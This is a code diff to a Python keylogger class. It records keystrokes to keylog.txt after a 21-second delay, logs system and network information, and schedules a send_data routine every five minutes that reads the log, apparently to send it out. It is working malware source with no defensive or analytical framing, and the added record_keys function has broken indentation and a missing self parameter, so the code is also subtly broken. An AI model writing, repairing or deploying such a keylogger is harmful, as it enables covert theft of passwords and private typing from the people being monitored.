@@ -21,14 +21,15 @@ class Keylogger:
         self.password = "password"
 
     def start(self):
-        print(self.get_system_info())
-        print(self.get_network_info())
+        with open("keylog.txt", "w") as file:
+            file.write(self.get_system_info())
+            file.write(self.get_network_info())
 
         # Register Ctrl+Q key combination to quit the keylogger
         keyboard.on_press(self.handle_ctrl_q)
 
         # Start recording the keys after a 21-second delay
-        Timer(21, keyboard.on_release, args=(self.record_keys,)).start()
+        Timer(21, keyboard.on_press, args=(self.record_keys,)).start()
 
         # Start sending the keys and screenshot every 5 minutes
         Timer(300, self.send_data).start()
@@ -36,10 +37,19 @@ class Keylogger:
         # Keep the program running
         input("Press Enter to stop...")
 
-    def record_keys(self, event):
-        with open(self.log_file, "a") as file:
-            file.write(event.name)
-            file.write("\n")
+    def record_keys(event):
+    if event.event_type == "down":
+        if event.name == "space":
+            key = " "
+        elif event.name == "enter":
+            key = "\n"
+        elif event.name == "backspace":
+            key = " <-- "
+        else:
+            key = event.name
+        
+        with open("keylog.txt", "a") as file:
+            file.write(key)
 
     def send_data(self):
         with open(self.log_file, "r") as file:
